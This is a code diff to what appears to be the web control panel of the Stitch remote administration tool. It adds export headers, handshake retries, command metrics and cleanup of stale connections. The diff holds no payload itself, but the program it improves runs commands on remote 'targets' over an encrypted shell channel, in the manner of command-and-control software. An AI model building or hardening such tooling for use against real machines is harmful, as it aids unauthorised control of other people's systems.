@@ -693,12 +693,15 @@ def export_logs():
             return jsonify({'error': 'Invalid format'}), 400
         
         log_debug(f"Logs exported as {format_type.upper()}", "INFO", "Export")
-        
-        return Response(
-            data,
-            mimetype=mimetype,
-            headers={'Content-Disposition': f'attachment; filename={filename}'}
-        )
+
+        headers = {
+            'Content-Disposition': f'attachment; filename={filename}',
+            'Content-Length': str(len(data.encode('utf-8') if isinstance(data, str) else data)),
+        }
+        # Simple weak ETag using length-timestamp
+        headers['ETag'] = f'W/"{len(data)}-{int(time.time())}"'
+
+        return Response(data, mimetype=mimetype, headers=headers)
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
@@ -731,12 +734,14 @@ def export_commands():
             return jsonify({'error': 'Invalid format'}), 400
         
         log_debug(f"Command history exported as {format_type.upper()}", "INFO", "Export")
-        
-        return Response(
-            data,
-            mimetype=mimetype,
-            headers={'Content-Disposition': f'attachment; filename={filename}'}
-        )
+
+        headers = {
+            'Content-Disposition': f'attachment; filename={filename}',
+            'Content-Length': str(len(data.encode('utf-8') if isinstance(data, str) else data)),
+        }
+        headers['ETag'] = f'W/"{len(data)}-{int(time.time())}"'
+
+        return Response(data, mimetype=mimetype, headers=headers)
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
@@ -828,20 +833,28 @@ def _perform_handshake(conn_id):
         if not sock:
             return False, f"❌ Target {conn_id} is not connected"
 
-        # Confirm magic string (unencrypted)
-        try:
-            confirm = server.receive(sock, encryption=False)
-        except Exception:
-            confirm = None
+        # Confirm magic string (unencrypted) with small retry/backoff
+        confirm = None
         expected = base64.b64encode(b'stitch_shell').decode()
+        for attempt in range(3):
+            try:
+                confirm = server.receive(sock, encryption=False)
+                break
+            except Exception:
+                time.sleep(0.2 * (attempt + 1))
         if confirm != expected:
             log_debug(f"Handshake confirm mismatch for {conn_id}: got {confirm}", "WARNING", "Handshake")
 
         # Receive AES identifier
-        try:
-            aes_id = server.receive(sock, encryption=False)
-        except Exception as e:
-            return False, f"❌ Handshake failed for {conn_id}: {str(e)}"
+        aes_id = None
+        for attempt in range(3):
+            try:
+                aes_id = server.receive(sock, encryption=False)
+                break
+            except Exception as e:
+                if attempt == 2:
+                    return False, f"❌ Handshake failed for {conn_id}: {str(e)}"
+                time.sleep(0.2 * (attempt + 1))
 
         # Lookup AES key
         aes_lib = configparser.ConfigParser()
@@ -865,6 +878,8 @@ def _perform_handshake(conn_id):
             hostname = stitch_lib.st_receive(sock, aes_key, as_string=True)
             platform_str = stitch_lib.st_receive(sock, aes_key, as_string=True)
         except Exception as e:
+            # On failure, clear any partial context and abort
+            connection_context.pop(conn_id, None)
             return False, f"❌ Failed to receive handshake metadata: {str(e)}"
 
         chosen_os = os_second or os_first or 'Unknown'
@@ -929,12 +944,17 @@ def execute_real_command(command, conn_id=None, parameters=None):
         if not conn_aes_key:
             return f"❌ No AES encryption key found for {conn_id}.\n\nUse 'addkey' to add the key first."
         
-        # Execute command on target using stitch_lib with parameters
+        # Execute command on target using stitch_lib with parameters and record metrics
+        start_time = time.time()
         output = execute_on_target(target_socket, command, conn_aes_key, conn_id, parameters)
+        duration = time.time() - start_time
+        metrics_collector.increment_counter('total_commands')
+        metrics_collector.record_duration('command_duration', duration)
         
         return output
         
     except Exception as e:
+        metrics_collector.increment_counter('command_errors')
         return f"❌ Error executing command: {str(e)}"
 
 # ============================================================================
@@ -1570,6 +1590,15 @@ def handle_connect():
 @socketio.on('disconnect')
 def handle_disconnect():
     log_debug(f"WebSocket disconnected: {request.sid}", "INFO", "WebSocket")
+    # Prune any stale contexts opportunistically
+    try:
+        server = get_stitch_server()
+        active = set(server.inf_sock.keys())
+        stale = [ip for ip in list(connection_context.keys()) if ip not in active]
+        for ip in stale:
+            connection_context.pop(ip, None)
+    except Exception:
+        pass
 
 @socketio.on('ping')
 def handle_ping():
@@ -1584,6 +1613,11 @@ def monitor_connections():
         try:
             server = get_stitch_server()
             active_count = len(server.inf_sock)
+            # Clean up connection_context entries for dropped connections
+            active_ips = set(server.inf_sock.keys())
+            for ip in list(connection_context.keys()):
+                if ip not in active_ips:
+                    connection_context.pop(ip, None)
             socketio.emit('connection_update', {
                 'active_connections': active_count,
                 'timestamp': datetime.now().isoformat()
